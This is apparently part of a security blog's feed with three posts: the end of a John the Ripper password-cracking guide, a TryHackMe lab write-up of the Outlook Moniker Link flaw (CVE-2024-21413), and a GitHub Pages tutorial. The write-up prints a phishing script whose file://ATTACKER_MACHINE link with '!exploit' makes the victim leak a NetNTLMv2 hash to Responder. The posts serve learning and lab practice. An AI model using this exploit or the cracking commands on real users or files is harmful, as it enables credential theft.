<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[List.Rules:MyCustomRule]</span><br></span></code></pre></div></div>
<p>This label <code>MyCustomRule</code> will be used when referencing your rule with the argument <code>--rules=</code>, the syntax of which you will now be familiar with.</p>
<ul>
<li class=""><code>--rules=</code>: specifies the custom rule that will be used during password cracking</li>
<li class=""><code>[rule]</code>: the rule label</li>
</ul>
<h5 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-apply-modifiers">2: Apply Modifiers<a href="https://paigehai.github.io/blog/jtr-guide#2-apply-modifiers" class="hash-link" aria-label="Direct link to 2: Apply Modifiers" title="Direct link to 2: Apply Modifiers" translate="no">​</a></h5>
<p>We can apply a wide range of modifiers to transform the words in the wordlist. Commonly used ones include:</p>
<ul>
<li class=""><code>Az</code> append characters to the end of a word</li>
<li class=""><code>A0</code> prepend characters to the beginning</li>
<li class=""><code>c</code> capitalise characters positionally (typically the first character)</li>
</ul>
<p>These can be combined to create unique and powerful password transformations.</p>
<h5 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-defining-character-sets">3: Defining Character Sets<a href="https://paigehai.github.io/blog/jtr-guide#3-defining-character-sets" class="hash-link" aria-label="Direct link to 3: Defining Character Sets" title="Direct link to 3: Defining Character Sets" translate="no">​</a></h5>
<p>Modifiers are followed by character sets, placed inside square brackets, and enclosed in double quotes. These define the characters that will be used in the transformation. Some include:</p>
<ul>
<li class=""><code>[0-9]</code> all digits from 0 to 9</li>
<li class=""><code>[0]</code> the digit 0 only</li>
<li class=""><code>[A-Z]</code> uppercase letters only</li>
<li class=""><code>[a-z]</code> lowercase letters only</li>
<li class=""><code>[A-z]</code> all upper and lowercase letters</li>
</ul>
<p><strong>Example Usage:</strong></p>
<ul>
<li class=""><code>[a]</code> will include the letter 'a' only</li>
<li class=""><code>[!#$%@]</code> specifies symbols <code>!</code>, <code>#</code>, <code>$</code>, <code>%</code>, and <code>@</code></li>
</ul>
<h5 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-example-rule">4: Example Rule<a href="https://paigehai.github.io/blog/jtr-guide#4-example-rule" class="hash-link" aria-label="Direct link to 4: Example Rule" title="Direct link to 4: Example Rule" translate="no">​</a></h5>
<p>Let's say we wanted to match a password like Paigepassword1!, and we already has paigepassword in the wordlist, we could define our custom rule as follows:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[List.Rules:PaigePassword]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cAz"[0-9][!#$%@]"</span><br></span></code></pre></div></div>
<p>In this rule:</p>
<ul>
<li class=""><code>c</code> capitalises the first character (<code>Paigepassword</code>)</li>
<li class=""><code>Az"[0-9][!#$%@]</code> will append a number (0–9), then one of the symbols <code>!#$%@</code></li>
</ul>
<h5 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-using-custom-rules">5: Using Custom Rules<a href="https://paigehai.github.io/blog/jtr-guide#5-using-custom-rules" class="hash-link" aria-label="Direct link to 5: Using Custom Rules" title="Direct link to 5: Using Custom Rules" translate="no">​</a></h5>
<p>To use this rule in John the Ripper, you would run the following:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=[path to wordlist] --rules=PaigePassword [path to file]</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="cracking-zip-files">Cracking Zip Files<a href="https://paigehai.github.io/blog/jtr-guide#cracking-zip-files" class="hash-link" aria-label="Direct link to Cracking Zip Files" title="Direct link to Cracking Zip Files" translate="no">​</a></h4>
<p>John the Ripper has a tool called <code>zip2john</code> which converts the Zip file into a hash format that John can understand. Commands are formatted as so:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">zip2john [options] [zip file] &gt; [output file]</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>[options]</code>: allows us to pass checksum options to <code>zip2john</code>, however, this shouldn't be necessary</li>
<li class=""><code>[zip file]</code>: the path to the zip file</li>
<li class=""><code>&gt;</code> redirects the output from the previous command to another file</li>
<li class=""><code>[output file]</code>: this file will store the output</li>
</ul>
<p><strong>Example Usage:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">zip2john zipfile.zip &gt; hash.txt</span><br></span></code></pre></div></div>
<p>Once we have the hash, we are now able to use this file as an input for John the Ripper to crack.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="cracking-rar-files">Cracking Rar Files<a href="https://paigehai.github.io/blog/jtr-guide#cracking-rar-files" class="hash-link" aria-label="Direct link to Cracking Rar Files" title="Direct link to Cracking Rar Files" translate="no">​</a></h4>
<p>John the Ripper has another tool called <code>rar2john</code> which extracts the hash value from a RAR file. The command to do so is:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rar2john [options] [rar file] &gt; [output file]</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>[options]</code>: allows us to pass checksum options to <code>rar2john</code>, however, this shouldn't be necessary</li>
<li class=""><code>[rar file]</code>: the path to the RAR file</li>
<li class=""><code>&gt;</code> redirects the output from the previous command to another file</li>
<li class=""><code>[output file]</code>: this file will store the output</li>
</ul>
<p><strong>Example Usage:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rar2john rarfile.rar &gt; hash.txt</span><br></span></code></pre></div></div>
<p>Once the hash has been extracted, we can use this with John the Ripper and a wordlist of your choice:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="cracking-office-files">Cracking Office Files<a href="https://paigehai.github.io/blog/jtr-guide#cracking-office-files" class="hash-link" aria-label="Direct link to Cracking Office Files" title="Direct link to Cracking Office Files" translate="no">​</a></h4>
<p>John the Ripper includes a tool called <code>office2john</code>, which extracts the hash from Microsoft Office documents (e.g., .doc, .docx, .xls, .xlsx) and converts it into a format John can crack.</p>
<p>The basic command format is:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">office2john [office file] &gt; [output file]</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>[office file]</code>: the path to the Office document</li>
<li class=""><code>&gt;</code>: redirects the output from the command into a new file</li>
<li class=""><code>[output file]</code>: the file that will store the extracted hash</li>
</ul>
<p><strong>Example Usage:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">office2john officefile.xlsx &gt; hash.txt</span><br></span></code></pre></div></div>
<p>You can now pass the extracted file to John with a wordlist of your choice:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<p>This process works with most modern Office file formats, given they are password-protected.</p>
<p>I hope that this guide has been informative, and you have gained valuable insights into how John the Ripper functions. To test your skills, make sure you try out TryHackMe's <a href="https://tryhackme.com/room/johntheripperbasics" target="_blank" rel="noopener noreferrer" class="">John the Ripper: The Basics</a> room, of which this blog post was inspired by.</p>]]></content:encoded>
            <category>Guide</category>
            <category>Tools</category>
        </item>
        <item>
            <title><![CDATA[Moniker Link (CVE-2024-21413) Exploit Write-Up]]></title>
            <link>https://paigehai.github.io/blog/moniker-link-writeup</link>
            <guid>https://paigehai.github.io/blog/moniker-link-writeup</guid>
            <pubDate>Fri, 20 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/moniker-thumb.png" alt="Moniker Link Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>This writeup demonstrates how to exploit the Moniker Link vulnerability responsible for RCE and credential leak vulnerabilities.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-introduction">1. Introduction<a href="https://paigehai.github.io/blog/moniker-link-writeup#1-introduction" class="hash-link" aria-label="Direct link to 1. Introduction" title="Direct link to 1. Introduction" translate="no">​</a></h3>
<p>This writeup comes from the TryHackMe <a href="https://tryhackme.com/room/monikerlink" target="_blank" rel="noopener noreferrer" class="">Moniker Link (CVE-2024-21413)</a> room, where I demonstrate how to exploit a machine with the CVE-2024-21413 vulnerability.</p>
<p>This vulnerability has been noted alongside the following details:</p>
<table><thead><tr><th><strong>Field</strong></th><th><strong>Details</strong></th></tr></thead><tbody><tr><td><strong>CNA</strong></td><td>Microsoft Corporation</td></tr><tr><td><strong>Published</strong></td><td>2024-02-13</td></tr><tr><td><strong>Updated</strong></td><td>2025-05-03</td></tr><tr><td><strong>Title</strong></td><td>Microsoft Outlook Remote Code Execution Vulnerability</td></tr><tr><td><strong>Description</strong></td><td>Microsoft Outlook Remote Code Execution Vulnerability</td></tr><tr><td><strong>CWE ID</strong></td><td>CWE-20: Improper Input Validation</td></tr><tr><td><strong>CVSS Score</strong></td><td>9.8 (CRITICAL)</td></tr><tr><td><strong>CVSS Vector</strong></td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C</code></td></tr><tr><td><strong>Affected Products</strong></td><td><ul><li><strong>Microsoft Office 2019</strong> on 32-bit and x64 systems: from 19.0.0 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a></li><li><strong>Microsoft 365 Apps for Enterprise</strong> on 32-bit and x64 systems: from 16.0.1 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a></li><li><strong>Microsoft Office LTSC 2021</strong> on 32-bit and x64 systems: from 16.0.1 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a></li><li><strong>Microsoft Office 2016</strong> on 32-bit and x64 systems: from 16.0.0 before 16.0.5435.1001</li></ul></td></tr></tbody></table>
<p>Outlook renders its emails using Hyper Text Markup Language (HTML), which is a standard language for structuring and displaying content. This ensures that Outlook is able to interpret and display HTML elements, including hyperlinks that use protocols including HTTP and HTTPs. With this, another mechanism is able to be parsed by Outlook, and this mechanism is known as a <strong>Moniker Link</strong>.</p>
<p>These are unique URLs that leverage Windows COM (Component Object Model) monikers, where objects are used to dynamically reference resources or invoke unwelcome actions. When these links are embedded in emails, they can be created in such a way that invoke local or remote resources in malicious ways. In the vulnerable version of Outlook that I will be using in this demonstration, a Moniker Link can be exploited to trigger the automatic loading of malicious content, potentially leading to Remote Code Execution (RCE) without user interaction.</p>
<p>Outlook does implement a security feature that prompts a message when external applications are triggered, and is called <strong>Protected View</strong>. This feature opens emails that contain items such as attachments, hyperlinks, or similar type of content in read-only mode. This allows Outlook to block actions such as macros.</p>
<p>In this walkthrough, I will be using <code>file://</code> as the Moniker Link in the malicious hyperlink. As Outlook will block the typical Moniker Link<br>
<code>&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test"&gt;Click me&lt;/a&gt;&lt;/p&gt;</code>, I will instead adjust the link to include an <strong>exclamation mark</strong>, which is a special character that can bypass Outlook's Protected View. When updated, the Moniker Link becomes<br>
<code>&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!exploit"&gt;Click me&lt;/a&gt;&lt;/p&gt;</code>. Notice the placement of the special character.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-scope">1.1 Scope<a href="https://paigehai.github.io/blog/moniker-link-writeup#11-scope" class="hash-link" aria-label="Direct link to 1.1 Scope" title="Direct link to 1.1 Scope" translate="no">​</a></h4>
<p>• Creation of Exploit Python File<br>
<!-- -->• Setting Up the Attack<br>
<!-- -->• Executing the Exploit</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-creation-of-exploit-python-file">2. Creation of Exploit Python File<a href="https://paigehai.github.io/blog/moniker-link-writeup#2-creation-of-exploit-python-file" class="hash-link" aria-label="Direct link to 2. Creation of Exploit Python File" title="Direct link to 2. Creation of Exploit Python File" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used">Tools Used<a href="https://paigehai.github.io/blog/moniker-link-writeup#tools-used" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>nano</strong>: a tool that is used to edit files and scripts from the terminal</p>
<p>This investigation start with the use of a victim machine and an attacker machine. A script titled <code>exploit.py</code> was created, as provided by TryHackMe.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">'''</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Author: CMNatic | https://github.com/cmnatic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Version: 1.0 | 19/02/2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'''</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import smtplib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from email.mime.text import MIMEText</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from email.mime.multipart import MIMEMultipart</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from email.utils import formataddr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password = input("Enter your attacker email password: ")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">html_content = """\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!DOCTYPE html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;html lang="en"&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!exploit"&gt;Click me&lt;/a&gt;&lt;/p&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/html&gt;"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">message = MIMEMultipart()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">message['Subject'] = "CVE-2024-21413"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">message["From"] = formataddr(('CMNatic', sender_email))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">message["To"] = receiver_email</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Convert the HTML string into bytes and attach it to the message object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msgHtml = MIMEText(html_content,'html')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">message.attach(msgHtml)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server = smtplib.SMTP('MAILSERVER', 25)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server.ehlo()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">try:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    server.login(sender_email, password)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">except Exception as err:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print(err)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit(-1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">try:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    server.sendmail(sender_email, [receiver_email], message.as_string())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print("\n Email delivered")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">except Exception as error:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print(error)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">finally:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    server.quit()</span><br></span></code></pre></div></div>
<p>It is important to adjust the <code>ATTACKER_MACHINE</code> and <code>MAILSERVER</code>. In this investigation, I replaced <code>ATTACKER_MACHINE</code> with my attacker IP address <strong>10.10.90.151</strong>, and <code>MAILSERVER</code> with the server IP address generated by TryHackMe, <strong>10.10.46.81</strong>.</p>
<p>Once edited, I input the command <code>nano exploit.py</code>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-1.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>In this new panel, I pasted the updated script. After this was completed, I saved this to the machine, ready for exploitation!</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-2.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-setting-up-the-attack">3. Setting Up the Attack<a href="https://paigehai.github.io/blog/moniker-link-writeup#3-setting-up-the-attack" class="hash-link" aria-label="Direct link to 3. Setting Up the Attack" title="Direct link to 3. Setting Up the Attack" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used-1">Tools Used<a href="https://paigehai.github.io/blog/moniker-link-writeup#tools-used-1" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>responder</strong>: a tool that can be used to capture and manipulate network authentication protocols<br>
<!-- -->• <strong>Outlook</strong>: an email application that allows a user to receive and send emails</p>
<p>To execute this exploit, the victim machine runs a vulnerable version of Outlook.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-3.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>I ran the responder tool utilising the command <code>responder -I ens5</code>. Responder will be used in this investigation as it can be used to networking poisoning attacks, enabling it to harvest credentials. <code>-I ens5</code> denotes the network interfact to listen from, which is <strong>ens5</strong> in my case.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-4.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-executing-the-attack">4. Executing the Attack<a href="https://paigehai.github.io/blog/moniker-link-writeup#4-executing-the-attack" class="hash-link" aria-label="Direct link to 4. Executing the Attack" title="Direct link to 4. Executing the Attack" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used-2">Tools Used<a href="https://paigehai.github.io/blog/moniker-link-writeup#tools-used-2" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>Outlook</strong><br>
<!-- -->• <strong>exploit.py</strong></p>
<p>In a new terminal, I executed my exploit script using the command <code>python3 exploit.py</code>. When requested, I provided the password of the attacking email as per TryHackMe's website which is <code>attacker</code>. I can see that this has been successful, as the program prints the message <code>Email delivered</code>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-5.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>Viewing this email in the victim machine, they have received a suspicious email with a link that says <strong>Click me</strong>. When clicked, an error is shown.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-6.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<p>Reviewing the responder results in the attacker machine, I am now able to observe the sensitive netNTLMv2 password hash of the victim.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/moniker-7.png" alt="Moniker Link Writeup" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-conclusion">5. Conclusion<a href="https://paigehai.github.io/blog/moniker-link-writeup#5-conclusion" class="hash-link" aria-label="Direct link to 5. Conclusion" title="Direct link to 5. Conclusion" translate="no">​</a></h3>
<p>In this demonstration, I highlight how an attacker may exploit <strong>CVE-2024-21413</strong> by crafting an email which contains a <strong>moniker link</strong> to obtain the users <strong>NTMLv2</strong> password hash from a vulnerable Outlook client. A python-based script is used alongside <strong>responder</strong> to listen for authentication attempts. In this simulation, the victim has been successfully tricked into initiating a connection with the malicious file path, which subsequently triggers automatic credential harvesting. The underlying behaviour in this version of Outlook, which is rendering and attempting to access the embedded <code>file://</code> was sufficient to leak the users authentication data to my AttackBox. This demonstrates the inherent risk in client-sidew parsing of these types of crafted links and foregrounds the importance of security updates and disabling link resolution in email clients. In this controlled environment, this writeup has thoroughly illustrated how even with minimal user interaction, credentials can still be compromised and stolen. Reflecting on methods to mitigate these types of attacks, users can implement more secure configurations within email clients, and ensuring proactive patch management to effectively protect against vulnerabilities such as CVE-2024-21413.</p>]]></content:encoded>
            <category>Write Up</category>
            <category>Vulnerabilities</category>
            <category>Tools</category>
        </item>
        <item>
            <title><![CDATA[A Cheat Sheet on How to Create Your Own GitHub Pages Portfolio]]></title>
            <link>https://paigehai.github.io/blog/github-pages-guide</link>
            <guid>https://paigehai.github.io/blog/github-pages-guide</guid>
            <pubDate>Tue, 17 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/github-thumb.png" alt="GitHub Pages Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A quick cheat sheet for those who are interested in putting their development skills to the test. This cheat sheet provides the preliminary steps in setting up and deploying a GitHub Pages portfolio that you can use to show off your work.</p>
<p>After a close friend of mine had introduced me to GitHub pages through her own portfolio (shout out to you, <a href="https://briannalaird.com/" target="_blank" rel="noopener noreferrer" class="">Brianna</a>!), I quickly became hooked on the idea of creating my own portfolio from scratch! Taking note of my walkthrough in making my portfolio was both for my own reference, and so I am able to guide others on how to create their own portfolio's. What good is knowledge if you cannot share it!</p>
<p>In this guide, I provide step-by-step instructions, including code snippets, that you can use to create your own GitHub Pages portfolio, and maintain it. This is the method I have found to be most convenient, however, I always encourage others to challenge my process (and let me know if you find something even better that I can implement!).</p>
<p><em>Please note:</em> this guide has been created using MKDocs and their <em>Simple Blog</em> theme, so if you have chosen another, then this process may not work as effectively. Additionally, I am building this portfolio with Linux so commands might differ on Windows or MacOS.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-create-your-github-repository">Step 1: Create Your GitHub Repository<a href="https://paigehai.github.io/blog/github-pages-guide#step-1-create-your-github-repository" class="hash-link" aria-label="Direct link to Step 1: Create Your GitHub Repository" title="Direct link to Step 1: Create Your GitHub Repository" translate="no">​</a></h3>
<p>To get started on my portfolio, I needed to create a GitHub repository. To ensure it works as expected, you must include <code>.github.io</code> in the repository name.<br>
<!-- -->For mine, I chose: <code>paigehai.github.io</code>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port1.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<p>Before clicking <strong>Create Repository</strong>, make sure <strong>Add a README file</strong> is checked.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port5.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>Once this had been created, I proceeded to populate the repository with my default GitHub <code>README.md</code> file.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port2.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<p>Once you have created your repository, and have added a simple <code>README.md</code> file, navigate to the <strong>Settings</strong> tab in the repo.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port3.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<p>Navigate to the <strong>Pages</strong> tab in the left panel.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port4.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:250px;width:100%;height:auto"></div>
<p>To deploy this current version of the website, we must select the <strong>main</strong> branch, under the <strong>Branch</strong> selection in the right panel.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port6.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<p>You will now have a basic website that you can visit!</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port7.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:800px;width:100%;height:auto"></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-build-the-website">Step 2: Build the Website<a href="https://paigehai.github.io/blog/github-pages-guide#step-2-build-the-website" class="hash-link" aria-label="Direct link to Step 2: Build the Website" title="Direct link to Step 2: Build the Website" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-1-using-the-commands-provided-by-fernando-celmer">Method 1: Using the command's provided by Fernando Celmer<a href="https://paigehai.github.io/blog/github-pages-guide#method-1-using-the-commands-provided-by-fernando-celmer" class="hash-link" aria-label="Direct link to Method 1: Using the command's provided by Fernando Celmer" title="Direct link to Method 1: Using the command's provided by Fernando Celmer" translate="no">​</a></h4>
<p>The theme that I chose for my website was <a href="https://github.com/FernandoCelmer/mkdocs-simple-blog" target="_blank" rel="noopener noreferrer" class="">Simple Blog</a> by MKDocs.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port8.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
